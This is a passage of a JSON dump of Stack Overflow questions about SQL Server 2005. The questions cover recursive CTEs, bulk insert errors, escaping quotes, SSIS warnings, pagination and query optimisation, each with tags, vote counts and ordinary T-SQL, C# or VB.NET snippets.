com.riskintegrator.slsb.ScheduledBatchBean.executeJob(ScheduledBatchBean.java:568)\n      com.riskintegrator.slsb.ScheduledBatchBean.executeDailyRunOnce(ScheduledBatchBean.java:792)\n      com.riskintegrator.slsb.ScheduledBatchBean.ejbTimeout(ScheduledBatchBean.java:957)\n      weblogic.ejb.container.timer.TimerImpl.timerExpired(TimerImpl.java:219)</p>\n  \n  <p>^-- Holding lock: weblogic.ejb.container.timer.TimerImpl@12c8e34[thin lock]\n      weblogic.timers.internal.TimerImpl.run(TimerImpl.java:253)\n      weblogic.work.SelfTuningWorkManagerImpl$WorkAdapterImpl.run(SelfTuningWorkManagerImpl.java:516)\n      weblogic.work.ExecuteThread.execute(ExecuteThread.java:198)\n      weblogic.work.ExecuteThread.run(ExecuteThread.java:165)</p>\n</blockquote>\n"},{"tags":["c#","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":426,"score":0,"question_id":1635003,"title":"How to Ignore SQL Error? - C#","body":"<p>I am making an insert on a unique column and the system is returning an error saying I can't insert duplicate rows. How can I ignore this error in C#?</p>\n\n<p><strong>Edit</strong>\nWithout using try/catch</p>\n\n<p>See <a href=\"http://stackoverflow.com/questions/1634833/insert-a-row-only-if-a-row-does-not-exist\">this question</a> for why I want to ignore the error.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":23,"score":2,"question_id":13248659,"title":"Round the third decimal place up into the second decimal place (e.g. $0.033 becomes $0.04)","body":"<p>When we increased the price with 10%, some products (the ones that have 3 decimal points), got an unwanted price change. For example, an item that had a price of <code>0.03</code> changed to <code>0.033</code>. </p>\n\n<p>Our client doesn't want a three decimal point in the pricing. </p>\n\n<p>We want to round the third decimal place up into the second decimal place (e.g. <code>$0.033</code> becomes <code>$0.04</code>).</p>\n\n<p>If my value is <code>0.033</code>, I want result to be <code>0.04</code>.</p>\n\n<p>Please help me</p>\n\n<p>Regards</p>\n\n<p>Amit Vyas</p>\n"},{"tags":["sql-server","sql-server-2005","tsql","truncate","foreign-keys"],"answer_count":13,"favorite_count":14,"up_vote_count":60,"down_vote_count":0,"view_count":77606,"score":60,"question_id":253849,"title":"Cannot truncate table because it is being referenced by a FOREIGN KEY constraint?","body":"<p>Using MSSQL2005, Can I truncate a table with a foreign key constraint if I first truncate the child table(the table with the primary key of the FK relationship)?</p>\n\n<p>I know I can use a DELETE without a where clause and then RESEED the identity OR</p>\n\n<p>Remove the FK, truncate and recreate but I thought as long as you truncate the child table you'll be OK however I'm getting a </p>\n\n<p>\"Cannot truncate table 'TableName' because it is being referenced by a FOREIGN KEY constraint.\"</p>\n\n<p>error.</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":85,"score":3,"question_id":13157508,"title":"Why does a NULL aggregate warning in an SQL query causes the SSIS package to fail?","body":"<p>An SSIS Package was failing with an error message as below: </p>\n\n<blockquote>\n  <p>Code: 0xC0202009\n     Source: DFT Populate ImageSummary OLE_SRC ProductImage [1]\n     Description: SSIS Error Code DTS_E_OLEDBERROR.  An OLE DB error has occurred. Error code: 0x80004005.\n  An OLE DB record is available.  Source: \"Microsoft SQL Native Client\"  Hresult: 0x00040EDA  Description: \"Warning: Null value is eliminated by an aggregate or other SET operation.\".</p>\n</blockquote>\n\n<p>On investigation, we have found that the message <code>Warning: Null value is eliminated by an aggregate or other SET operation.</code> is being returned by a SQL server (2005) query which the SSIS package runs as the source in DFT to insert into a destination table.</p>\n\n<pre><code>Select ProductID ,ImageTypeID ,DistinctImageCount ,ImageSize \nfrom \n    (select a.ProductID ,a.ImageTypeID ,a.DistinctImageCount ,a.ImageSize ,RANK() OVER (PARTITION BY a.ProductID, a.ImageTypeID ORDER BY a.ImageSize) As Ranker \n    from \n        (SELECT TOP 100 Percent spi.ProductID ,sit.ImageTypeID ,CAST(COUNT(DISTINCT spi2.ImageTypeID) as bit) DistinctImageCount ,CAST(spi2.Size as varchar(50)) as ImageSize \n        FROM Stage.ProductImage spi CROSS JOIN Reference.ImageType sit LEFT JOIN Stage.ProductImage spi2 ON spi.ProductID = spi2.ProductID AND sit.ImageTypeID = spi2.ImageTypeID \n        GROUP BY spi.ProductID, sit.ImageTypeID,spi2.Size \n        ORDER BY spi.ProductID, sit.ImageTypeID,spi2.Size\n        )a\n    )b \nwhere ranker = 1 \nOrder by ProductID,ImageTypeID\n</code></pre>\n\n<p>We have resolved the issue by eliminating the warning message from SQL server by modifying the query: </p>\n\n<h3>From</h3>\n\n<p><code>CAST(COUNT(DISTINCT spi2.ImageTypeID)as bit) DistinctImageCount</code></p>\n\n<h3>To</h3>\n\n<p><code>CAST(SUM(DISTINCT ISNULL(spi2.ImageTypeID,0)) as bit) DistinctImageCount</code>. </p>\n\n<p>However we have few questions as below which we couldn't find an explanation and hoping to get an answer on this forum:</p>\n\n<ol>\n<li><p>Why does a warning from SQL bubbles up to the SSIS package and causes the\nSSIS package to fail?</p></li>\n<li><p>If we run the same package in all other dev and UAT environments\nwith the same data set, it works fine. We can see the warning\nshowing up in the SQL Server Management Studio, however does not\ncause the SSIS to fail. However the SSIS package in our Production\nenvironment fails. We are failing to understand the logic? Is there\nany threshold of warnings?</p></li>\n</ol>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13246561,"title":"select data vice versa","body":"<p>I have two table in my database.</p>\n\n<pre><code>1) User Table\n\nid  username    password    logo    email\n1   admin        admin      NULL    1   \n2   support     support     NULL    NULL    \n3   test        test        NULL    NULL    \n\n\n2) Link Account Table\n\nID  AccountID   LinkAccountID\n1       1           2\n</code></pre>\n\n<p>Now if i select username with accountid 1 then it will return me Admin and Support\n    same way if i select username with accountid 2 then also it will return admin and support\n    and if i select username with accountid 3 then it will return only test</p>\n\n<p>something like vice versa if in link account table account id is 1 or linkaccountid is 1 that will return both id</p>\n\n<p>Thanks in advance</p>\n\n<p>Regards</p>\n\n<p>Amit Vyas</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13246266,"title":"I want to give a parameter for a function from a value from with","body":"<pre class=\"lang-sql prettyprint-override\"><code>WITH\nEmpDetails(EmpCode)\nAS\n(\n SELECT EmpCode \n FROM Employee.tblEmp_Demographics \n WHERE RecordStatus='present' \n)  \n\n    select *,ROW_NUMBER() OVER (PARTITION BY EmpCode ORDER BY DateTaken DESC) AS RowNum,    \n    (select GradeName From Master.GradeMaster where GradeCode=Grade And Deleted=0) As Grade,    \n    SUM(Amount) OVER(PARTITION BY Grade) AS EmpAmount,\n    SUM(DependentAmount) OVER(PARTITION BY Grade) As DepAmount,\n    0 As CheckNo \n    from [dbo].[SELECT_AIRTICKET_DETAILS_BY_DATE](EmpDetails.EmpCode,getdate(),1) WHERE YEAR(DateTaken)=year(getdate())\n</code></pre>\n\n<p>But i get an error</p>\n\n<blockquote>\n  <p>Msg 4104, Level 16, State 1, Line 11 The multi-part identifier \"EmpDetails.EmpCode\" could not be bound.</p>\n</blockquote>\n"},{"tags":["asp.net","sql-server-2008","sql-server-2005","c#-4.0","asp.net-webforms"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13245321,"title":"DataTableMapping using adapter.FillSchema method applied on a Stored Procedure","body":"<p>this is a method i was reading about  @MSDN , \nmy question is if for an example i would like to use it on a stored procedure \nwith the fact that the query of that stored procedure is already specifying columns to select from the table like following :</p>\n\n<pre><code>SELECT Columnsome, columnother, , , , ...FROM thisSQLdbTable\n</code></pre>\n\n<p>though i would like to implement the approach of that specific method , it seems very advanced from a little research i have made on \n <strong>\"the best way\"</strong> available to extract data from SQL Server into Asp.net DataTable.</p>\n\n<pre><code>public static DataTable GetCustomerData(string dataSetName,\nstring connectionString)\n{\nDataTable table = new DataTable(dataSetName);\n\nusing (SqlConnection connection = new SqlConnection(connectionString))\n{\n    SqlDataAdapter adapter = new SqlDataAdapter(\n        \"SELECT CustomerID, CompanyName, ContactName FROM dbo.Customers\", connection);\n\n    DataTableMapping mapping = adapter.TableMappings.Add(\"Table\", \"Customers\");\n    mapping.ColumnMappings.Add(\"CompanyName\", \"Name\");\n    mapping.ColumnMappings.Add(\"ContactName\", \"Contact\");\n\n    connection.Open();\n\n    adapter.FillSchema(table, SchemaType.Mapped);\n    adapter.Fill(table);\n    return table;\n}\n</code></pre>\n\n<p>}</p>\n\n<p>or is it not the method to use if i am querying via <code>SP</code> that specifies the selected column</p>\n\n<p>i could actually drop that stored procedure if it is not requiered to select /specify columns </p>\n\n<p>the stored procedure is doing a specific calculation and updates the table with results of calculation then i am switching it's \"MODE\" to select results from the table that was updated.</p>\n\n<p>what i did is recyceling (; giving it a parameter (bit type) \nstored procedure then asks for the value of supplied <code>bool</code> / <code>bit</code> Parameter, \nif its is status true it updates (doing its original task it was made for)</p>\n\n<p>if its false its doing a select oporation so i am using it as i would with 2 separated commands </p>\n\n<p><strong>but now</strong> that i have search for a better way to extract data from db into a Data table </p>\n\n<p>i give up on the two way SP and i will make a selection via the exaple above if they're not intended to be used thogether as with my current SP that does preselection when servs the <code>GetCustomersData()</code> above.</p>\n\n<p>So the question is do i need to let the function to make the selection or can i serve it with my sp ready made selection to implemet it with GetCustomersData() in the way that it will only do rest of task and only mapp the columns that was preselected </p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":18,"score":-2,"question_id":13245947,"title":"I am trying to optimize my code inorder to reduce the processing time","body":"<pre><code>SELECT\n  Account.AccountID,\n  subAccount.AccountID        AS SubAccountID,\n  Balance.currentAvailable    AS SubAccountBalance\nFROM\n  Account\nCROSS APPLY\n  dbo.getSubAccounts('User', Account.AccountID) AS SubAccount\nCROSS APPLY\n  dbo.getCurrentBalance(SubAccount.AccountID)   AS Balance\nWHERE\n  Account.AccountID = 1234\n</code></pre>\n\n<p>in this example how can i avoid cross appy inorder to reduce the execution time</p>\n"},{"tags":["sql-server-2005","recursion","timeout","common-table-expression"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":22,"score":1,"question_id":13244096,"title":"Getting access to additional node information using CTE Recursion SQL Server 2005","body":"<p>Background table data:</p>\n\n<pre><code>memberid sponsorid mailfirstname maillastname\n1000     NULL      Foo           Chu\n1001     1000      Foo1          Chu1\n1002     1001      Foo2          Chu2\n1003     1002      Foo3          Chu3\n1004     1003      Foo4          Chu4\n</code></pre>\n\n<p>The script below prints out the member I'm currently on.  But I also want to print the sponsor information for that member at the same time.  So, currently I get:</p>\n\n<pre><code>Level memberid sponsorid mailfirstname maillastname\n0     1000     NULL      Foo           Chu\n...\n2     1004     1003      Foo4          Chu4\n</code></pre>\n\n<p>but for the 1004 member, I also want their sponsor:</p>\n\n<pre><code>Level memberid sponsorid mailfirstname maillastname sponsorfname sponsorlname\n2     1004     1003      Foo4          Chu4         Foo3         Chu3\n</code></pre>\n\n<p>Query:</p>\n\n<pre><code>WITH Heirarchy\nAS\n(\n   SELECT \n      CONVERT( INT , 0 ) [Level],\n      T1.memberid,\n      T1.sponsorid,\n      T1.mailfirstname,\n      T1.maillastname\n   FROM\n      members T1\n   WHERE\n      T1.memberid = 20000283\n\n   UNION ALL\n\n   SELECT \n      CONVERT( INT , ( TH.[Level] + 1 ) ) [Level],\n      T1.memberid,\n      T1.sponsorid,\n      T1.mailfirstname,\n      T1.maillastname\n   FROM\n      members T1\n   INNER JOIN \n      Heirarchy TH ON TH.memberid = T1.sponsorid\n)\nSELECT * \nFROM Heirarchy \nORDER BY level, maillastname\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","common-table-expression","parents"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":4006,"score":4,"question_id":665617,"title":"How to create an SQL Server 2005 CTE to return parent-child records, for children with multiple parents","body":"<p>I'm experimenting with CTE's in SQL Server but have reached a dead end with getting the following scenario to work. I have a hierarchy table similar to this:</p>\n\n<pre><code>Node(ID:439)\n  Node(ID:123)\n    Node(ID:900)        \n  Node(ID:56)\n    Node(ID:900)\n</code></pre>\n\n<p>Expected results:</p>\n\n<pre><code>NodeID ParentNodeID\n439    0\n123    439\n900    123\n56     439\n900    56\n</code></pre>\n\n<p>So basically we have a parent-child hierarchy table, with one subtle difference. Each child could potentially have more then one parent. I have researched many blog articles, and StackOverflow posts, about creating CTE's that return parent-child records, but they don't return all of the parents for the children, just the first one that it finds.</p>\n\n<p>Here's an example CTE that I tried:</p>\n\n<pre><code>WITH Heirarchy(NodeID, ParentNodeID)\nAS\n(\n    SELECT \n        T1.NodeID,\n          T1.ParentNodeID\n    FROM\n        ParentChildTable T1\n    WHERE\n        T1.NodeID = 439\n\n    UNION ALL\n    SELECT \n        T1.NodeID,\n        T1.ParentNodeID\n    FROM\n        Heirarchy T1\n        INNER JOIN Heirarchy TH ON TH.NodeID = T1.ParentNodeID\n)\n</code></pre>\n\n<p>(Note: The names of the tables and columns in the above CTE have been changed from the orginal for privacy purposes.)</p>\n\n<p>The above CTE works fine, it finds all the parent-child records starting from ID:439, but it only finds one parent for item ID:900, even though it has two parents.</p>\n\n<p>Could someone let me know if this is possible using CTE's, or is there another SQL way to do this?</p>\n\n<p>Cheers.\nJas.</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2008","bulkinsert"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":537,"score":3,"question_id":7937581,"title":"Issue with bulk insert","body":"<p>I am trying to insert the data from this link to my SQL server \n<a href=\"https://www.ian.com/affiliatecenter/include/V2/CityCoordinatesList.zip\" rel=\"nofollow\">https://www.ian.com/affiliatecenter/include/V2/CityCoordinatesList.zip</a></p>\n\n<p>I created the table </p>\n\n<pre><code>CREATE TABLE [dbo].[tblCityCoordinatesList](\n[RegionID] [int] NOT NULL,\n[RegionName] [nvarchar](255) NULL,\n[Coordinates] [nvarchar](4000) NULL\n</code></pre>\n\n<p>) ON [PRIMARY]</p>\n\n<p>And I am running the following script to do the bulk insert</p>\n\n<pre><code>BULK INSERT tblCityCoordinatesList\nFROM 'C:\\data\\CityCoordinatesList.txt' \nWITH \n( \n    FIRSTROW = 2, \n    MAXERRORS = 0, \n    FIELDTERMINATOR = '|', \n    ROWTERMINATOR = '\\n'\n)\n</code></pre>\n\n<p>But the bulk insert fails with following error</p>\n\n<pre><code>Cannot obtain the required interface (\"IID_IColumnsInfo\") from OLE DB provider \"BULK\" for linked server \"(null)\".\n</code></pre>\n\n<p>When I google, I found several articles which says the issue may be with RowTerminator, but I tried everything like /n/r, /n etc, but nothing is working. </p>\n\n<p>Could anyone please help me to insert this data into my database?</p>\n\n<p>Thank you so much for your help.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":451,"score":0,"question_id":10834610,"title":"Date of inserting a row into table ","body":"<p>Is it possible to find date+time when a row was inserted into a table in SQL Server 2005?</p>\n\n<p>Does SQL Server log insert commands?</p>\n"},{"tags":["sql-server","sql-server-2005","named-instance"],"answer_count":7,"favorite_count":3,"up_vote_count":10,"down_vote_count":0,"view_count":16059,"score":10,"question_id":35026,"title":"SQL Server, convert a named instance to default instance?","body":"<p>I need to convert a named instance of SQL server 2005, to a default instance.</p>\n\n<p>Is there a way to do this without a reinstall?</p>\n\n<hr>\n\n<p>The problem is, 2 out of 6 of the developers, installed with a named instance. So its becoming a pain changing connection strings for the other 4 of us. I am looking for the path of least resistance to getting these 2 back on to our teams standard setup.  </p>\n\n<p>Each has expressed that this is going to be, too much trouble and that it will take away from their development time. I assumed that it would take some time to resolve, in the best interest of all involved, I tried combing through configuration apps installed and didn't see anything, so I figured someone with more knowledge of the inner workings would be here.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","sql-server-2008-r2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13202697,"title":"Updating a set of data from the output of a Table Valued Function","body":"<p>I am trying to write up a query that are merging duplicate client records in to a single record. Right now I am just building a mapping table to know what I should map with what.</p>\n\n<p>Here are the two functions I wrote to aid me in this</p>\n\n<pre><code>CREATE FUNCTION FindDuplicateClients ()\nRETURNS TABLE AS RETURN \n(\n    select distinct CLIENT_GUID \n    from CLIENTS c\n    inner join\n    (\n        select FIRST_NAME, LAST_NAME, HOME_PHONE\n        from CLIENTS\n        group by FIRST_NAME, LAST_NAME, HOME_PHONE\n        having COUNT(*) &gt; 1\n    ) t on c.FIRST_NAME = t.FIRST_NAME and c.LAST_NAME = t.LAST_NAME and c.HOME_PHONE = t.HOME_PHONE)\ngo\n\n--Find other clients that map to this client\nCREATE FUNCTION FindDuplicateClientsByClient (@Client uniqueidentifier)\nRETURNS TABLE AS RETURN \n(\n    select distinct CLIENT_GUID \n    from CLIENTS c\n    inner join\n    (\n        select x.FIRST_NAME, x.LAST_NAME, x.HOME_PHONE\n        from CLIENTS x\n        inner join \n        (\n            select FIRST_NAME, LAST_NAME, HOME_PHONE\n            from CLIENTS\n            where CLIENT_GUID = @Client\n        ) y on x.FIRST_NAME = y.FIRST_NAME and x.LAST_NAME = y.LAST_NAME and x.HOME_PHONE = y.HOME_PHONE\n        group by x.FIRST_NAME, x.LAST_NAME, x.HOME_PHONE\n        having COUNT(*) &gt; 1\n    ) t on c.FIRST_NAME = t.FIRST_NAME and c.LAST_NAME = t.LAST_NAME and c.HOME_PHONE = t.HOME_PHONE\n    where CLIENT_GUID &lt;&gt; @Client)\ngo\n</code></pre>\n\n<p>The first function successfully returns all <code>CLIENT_GUID</code>'s that have more than 1 record, the second you pass in a GUID and it returns all other guids that share the \"Common Information\" (first name, last name, and home phone in this case)</p>\n\n<p>The problem is filling out my mapping table. I have some rules I need to follow to give priority to some of the duplicates. For example anyone who has had transactions needs to not have their <code>CLIENT_GUID</code> changed, but they are able to have other GUIDs merged in to them (if the other GUIDs had no transactions)</p>\n\n<pre><code>--Create Mapping table\nselect CLIENT_GUID, CAST(null as uniqueidentifier) as NEW_CLIENT_GUID\ninto #mapping\nfrom FindDuplicateClients()\n\n--Do not map people who have transactions\nupdate #mapping\nset NEW_CLIENT_GUID = CLIENT_GUID\nwhere CLIENT_GUID in (select CLIENT_GUID from trnHistory)\n</code></pre>\n\n<p>Now here is where I am running in to trouble. I don't know how to get the list of people who had <code>NEW_CLIENT_GUID</code> set in the previous query, run <code>FindDuplicateClientsByClient</code> against that GUID, and set <code>NEW_CLIENT_GUID</code> of any result to the <code>NEW_CLIENT_GUID</code> that was fed in to the function without using a cursor.</p>\n\n<p>Here is the method I came up with using a cursor</p>\n\n<pre><code>declare cur cursor LOCAL FAST_FORWARD for select NEW_CLIENT_GUID from #mapping where NEW_CLIENT_GUID is not null\ndeclare @NEW_CLIENT_GUID uniqueidentifier\n\nopen cur\nfetch next from cur into @NEW_CLIENT_GUID\nwhile @@fetch_status = 0\nbegin\n    update #mapping\n    set NEW_CLIENT_GUID = @NEW_CLIENT_GUID\n    where CLIENT_GUID in (select CLIENT_GUID from FindDuplicateClientsByClient(@NEW_CLIENT_GUID)) --Find duplicates to this record\n        and NEW_CLIENT_GUID is null --Do not reassign values that are already set (ie: duplicates that have transactions)\n\n    fetch next from cur into @NEW_CLIENT_GUID\nend \n\nclose cur\ndeallocate cur\n</code></pre>\n\n<p>To me, iterating over each result in <code>#mapping</code> that has a value set does not seem correct to me. What would be the correct way to do this? I am using SQL Server 2008 R2 but I would prefer if it was compatible with SQL Server 2005 too.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","query-optimization"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":79,"score":-1,"question_id":13227560,"title":"SQL Server 2005 query optimization","body":"<p>My application need to get data from a SQL Server database. My problem is that there is 3 tables that has to be joined into a view. This takes a lot of time (about 30 sec to generate the view) So I was wondering if there is a way to optimize this SQL query?</p>\n\n<p>SQL query: </p>\n\n<pre><code>SELECT TOP (100) PERCENT Request1.RequestID,\n                         TrackIT.dbo.Sending.Barcode,\n                         TrackIT.dbo.Address_View.AdrID,\n                         TrackIT.dbo.Address_View.Name,\n                         TrackIT.dbo.Address_View.Street,\n                         TrackIT.dbo.Address_View.HouseNo,\n                         TrackIT.dbo.Address_View.Postal,\n                         TrackIT.dbo.Address_View.City,\n                         TrackIT.dbo.Address_View.Country,\n                         Request1.Latitude,\n                         Request1.Longitude,\n                         Request1.ReceivedDate\nFROM   (SELECT DISTINCT RequestID,\n                        Ltrim([Content]) AS Barcode,\n                        Latitude,\n                        Longitude,\n                        ReceivedDate\n        FROM   RequestWithLocation\n        WHERE  ( Site LIKE '%Z' )\n               AND ( [Content] &lt;&gt; '' )\n               AND ( AddressID = '0' )\n               AND ReceivedDate &gt; Dateadd(day, -7, Getdate())) AS Request1\n       INNER JOIN TrackIT.dbo.Sending\n         ON Request1.Barcode = TrackIT.dbo.Sending.Barcode\n       INNER JOIN TrackIT.dbo.Address_View\n         ON TrackIT.dbo.Sending.DeliveryAdrID = TrackIT.dbo.Address_View.AdrID\nORDER  BY AdrID \n</code></pre>\n\n<p>Can anyone help ?</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13230372,"title":"Order By alphanumeric values like numeric","body":"<p>there is a table's fields on MSSQL Serrver 2005 as VARCHAR. It contains alphanumeric values like \"A,B,C,D ... 1,2,3,...,10,11,12\" etc.</p>\n\n<p>When i use below codes;</p>\n\n<pre><code>....   \nORDER BY TableFiledName\n</code></pre>\n\n<p><strong>Ordering result is as follow</strong> 11,12,1,2,3 etc.</p>\n\n<p>When i use codes as below,</p>\n\n<pre><code>....   \n ORDER BY\n    CASE WHEN ISNUMERIC(TableFiledName) = 0 THEN CAST(TableFiledNameAS INT) ELSE TableFiledName END\n</code></pre>\n\n<p>I get error message as below;</p>\n\n<blockquote>\n  <p>Msg 8114, Level 16, State 5, Line 1 Error converting data type varchar\n  to float.</p>\n</blockquote>\n\n<p><strong>How can get like this ordering result:</strong> 1,2,3,4,5,6,7,8,9,10,11,12 etc..</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql","sql-server-2005","quotes","quotations"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":20134,"score":4,"question_id":775687,"title":"How to insert text with single quotation sql server 2005","body":"<p>I want to insert text with single quote \nEg john's to table  in sql server 2005 database</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":4,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":13697,"score":6,"question_id":1586560,"title":"How do I escape a single quote in sqlserver?","body":"<p>I'm trying to insert some text data into a table in SQLServer 9.\nThe text includes a single quote.\nHow do I escape that?\nI tried using two single quotes, but it threw me some errors.\neg. insert into my_table values('hi, my name''s tim.');</p>\n"},{"tags":["sql-server-2005","database-partitioning"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":597,"score":0,"question_id":7263151,"title":"Does partitioning work with SQL Server 2005 Standard edition SP2","body":"<p>I am using SQL Server 2005 Standard edition with SP2 in test environment. My local SQL Server is a Developer edition. </p>\n\n<p>I was able to partition the table on my local computer. I know that the SQL Server Standard edition does not support either indexed views or partitioning. I just wanted to know if the SP2 has made any difference to the Standard edition.</p>\n\n<p>Thanks\nvihar.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":13227030,"title":"Finding first matched string in a column in SQL Server","body":"<p>I have a table as follows:</p>\n\n<pre><code>TABLE1\n\nNo  Description\n1   Hello Hai Hello\n2   Good Bad Good\n3   Hello Good Hai\n4   Hai Hello Bad\n5   Hello Hello Hello\n</code></pre>\n\n<p>Now if I run the following query:</p>\n\n<pre><code>Select * \nfrom TABLE1 \nwhere Description like '%Hai%' \n   OR  Description like '%Hello%' \n   OR Description like '%Good%'\n</code></pre>\n\n<p>I want the result as follows ( By adding one extra column \"FIRST MATCHED WORD\"):</p>\n\n<pre><code>No  Description     First Matched Word\n1   Hello Hai Hello     Hai\n2   Good Bad Good       Good\n3   Hello Good Hai      Hai\n4   Hai Hello Bad       Hai\n5   Hello Hello Hello   Hello\n</code></pre>\n\n<p>Hear my intention is to find out the first matched word depends on our query. Kindly help me.</p>\n"},{"tags":[".net","sql","sql-server","sql-server-2005"],"answer_count":7,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":3450,"score":0,"question_id":4941489,"title":"Query vs Stored procedure; difference between two approaches","body":"<p>I am developing a web page for search. I have two options to build this page</p>\n\n<ol>\n<li><p>To build the query on page according to parameter enter by the user and send it to server.</p></li>\n<li><p>To send parameters to stored procedure and build query there and get it executed.</p></li>\n</ol>\n\n<p>I want to know that which approach I should adopt and why. </p>\n\n<p>I want to know the advantages or disadvantages of both approaches. </p>\n"},{"tags":["sql-server-2005","excel","reporting-services","export"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":3285,"score":2,"question_id":393669,"title":"Disabling or overriding the excel and pdf export function in Reporting Services","body":"<p>Is there a way to disable or override the excel and pdf export function in SQL Server Reporting Services. I want to my own custom excel export.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008-r2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13218482,"title":"Check for SQL Server existence before connection","body":"<p>We need to check for the existence of a SQL server across all domains prior to attempting to connect to the server. We can loop through the list of servers on the local domain use SQLDataSourceEnumerator, but that takes a few seconds to load up and it only gets the local domain. We are using SQL Server 2005 and 2008 servers as well as .Net 2010. We don't want to attempt to connect and wait for the 30 second or more timeout that appears to be standard if the server doesn't exist. </p>\n\n<p>Any suggestions would be helpful.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":4707,"score":2,"question_id":4374880,"title":"How to use between operator with case statement in SQL Server 2005","body":"<p>How to use <code>BETWEEN</code> operator with <code>CASE</code> statement</p>\n\n<pre><code>@FromEmpAge\n@ToempAge\n\nselect * from Emp\nwhere EmpAge between\n  case when ToempAge0 then @FromEmpAge and @ToempAge end\n</code></pre>\n\n<p>How to do this?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":311,"score":3,"question_id":3872173,"title":"Compare when value could be both NULL or text","body":"<p>Now I know you can't directly compare NULL to anything (as null is unknown) so how would I achieve the following:</p>\n\n<pre><code>select  *\n    from    Material as m\n    where   MtrlCode = 826 and\n            Exposlimit &lt;&gt; 'compareMe'\n</code></pre>\n\n<p>Where Exposlimit MAY be NULL or it may not be.\n'compareMe' may also be NULL.</p>\n\n<p>Therefore how do I compare the two?  Both sides could be either text or NULL.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":6,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3813,"score":3,"question_id":3702576,"title":"SQL if no rows are returned do this","body":"<p>I have a select statement and I want to say if this select statement does not return any rows then put a '' in every cell. How do I do this?</p>\n"},{"tags":["c#","asp.net","sql-server-2005","visual-studio-2008"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13208601,"title":"How to insert a row into SQL Server 2005 using c#","body":"<p>I am using VS 2008 and SQL Server 2005. I am using below code to insert a row to a table.</p>\n\n<p>Table is <code>TestTable</code>, and it has a single column <code>Name</code> (<code>varchar(50)</code>).</p>\n\n<p>I am totally new to c# coding, please help me in this.</p>\n\n<pre><code>protected void Button1_Click(object sender, EventArgs e)\n{\n    try\n    {\n        string sql = \"insert into TestTable(Name) values (vinayak)\";\n        using (SqlConnection conn = new SqlConnection(\"Data Source=VINAYAK-PC;Initial Catalog=TestTable;Integrated Security=True;\"))\n        {\n            conn.Open();\n            using (SqlCommand cmd = new SqlCommand(sql, conn))\n            {\n                cmd.Parameters.AddWithValue(\"@Name\", \"test\"); // assign value to parameter \n                cmd.ExecuteNonQuery();\n            }\n        }\n    }\n    catch (SqlException ex)\n    {\n        string msg = \"Insert Error:\";\n        msg += ex.Message;\n    }\n}\n</code></pre>\n"},{"tags":["c#","sql","sql-server","sql-server-2005","gridview"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13207520,"title":"Pagination through Sql query","body":"<p>I am developing an application in which am using grid view. I want to use pagination for that grid view by using sql query.</p>\n\n<p>I want to display records with the help of <code>pagesize</code> and <code>pageindex</code>. </p>\n\n<p>How can I do this with sql query?</p>\n"},{"tags":["sql-server","vb.net","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":17,"score":1,"question_id":13207479,"title":"Auto Suggestion textbox","body":"<p>I want to have a auto suggestion textbox which will show the name of employee after typing a specific letter. The name is present in the employee table in three columns i.e firstname, middlename, lastname.</p>\n\n<p>I have tried a code for this but it can show only one column of the table i.e the firstname.\nHow to concatenate all the three columns so that they are suggested in the textbox.</p>\n\n<p>My code:</p>\n\n<pre><code>Dim strSql As String = \"select P_Firstname, P_MiddleName, P_LastName from Patient_Registration\"\n        Dim dtb As New DataTable\n     